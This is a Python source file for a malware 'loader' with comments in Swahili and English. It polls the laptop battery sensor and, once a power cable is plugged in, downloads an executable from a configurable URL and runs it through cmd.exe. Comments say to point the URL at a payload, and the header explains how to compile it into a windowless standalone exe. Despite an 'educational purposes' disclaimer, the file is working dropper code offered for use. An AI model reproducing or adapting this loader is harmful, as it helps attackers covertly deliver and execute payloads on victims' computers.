import socket
import subprocess
import os
import psutil
import time
import logging
import requests

'''
        This Loader was written for Educational Purposes!! Don't misuse
                            Author: AuxGrep
                            Year:   2024

        You can compile to exe with pyinstaller
        >> pyinstaller --noconfirm --onefile --windowed  "power-plugin-LOADER.py"

        BE FREE TO EDIT AND MAKE IT YOURS

'''

# let's configure kwanza log settings
logging.basicConfig(filename='system_log.log', level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s')

# tutengeneze a dict container yenye direct link to download and executable file na kukisave 
config = {
    'DownloadURL': 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe',  # point your payload hapa
    'ExecutableName': 'downloaded_file.exe' 
}

def battery_power_check():
    # Now let's check kama power cable ipo imechomekwa
    battery = psutil.sensors_battery()
    if battery is None:
        # Tukigundua kama machine haina battery we return False/no data
        logging.error("No battery found on device.")
        return False
    return battery.power_plugged

def download_and_execute(url, filename):
    # hapa tutastart download the executable file from the specified link on config
    try:
        response = requests.get(url)
        with open(filename, 'wb') as file:
            file.write(response.content)
        logging.info(f"Downloaded {filename} successfully.")

        if os.name == 'nt': # hapa unaweza fanya mengi, unaweza check if os ni Linux/Win ukaweka procedure za Win/linux
            print('[----] Executing the Payload') # tutaexecuted the downloaded file
            subprocess.run(['cmd.exe', '/c', filename], shell=True)
        logging.info(f"Executed {filename} successfully.")
    except Exception as e:
        logging.error(f"Error in download_and_execute: {e}")

def main():
    # Tutaanzisha loader yetu kwa kucheck battery sensor kudetect powerinput
    print('[****] Loader started....')
    logging.info("Starting monitoring script in background.")
    last_state = battery_power_check()

    while True:
        # kama user kachomeka tyar power au hajachomeka tuta loop kwa kucheck battery sensor kwa kila 1 second.
        time.sleep(1)  # Ongeza au punguza ukitaka delay on checking power sensor
        current_state = battery_power_check()

        if current_state and not last_state:
            # sasa tukidetect any power state change means user amechomeka charge so tutaexecute the loader
            print('[----] Power cable plugged in. Initiating download and execution.')
            logging.info("Power cable plugged in. Initiating download and execution.")
            download_and_execute(config['DownloadURL'], config['ExecutableName'])

        last_state = current_state

if __name__ == "__main__":
    main()
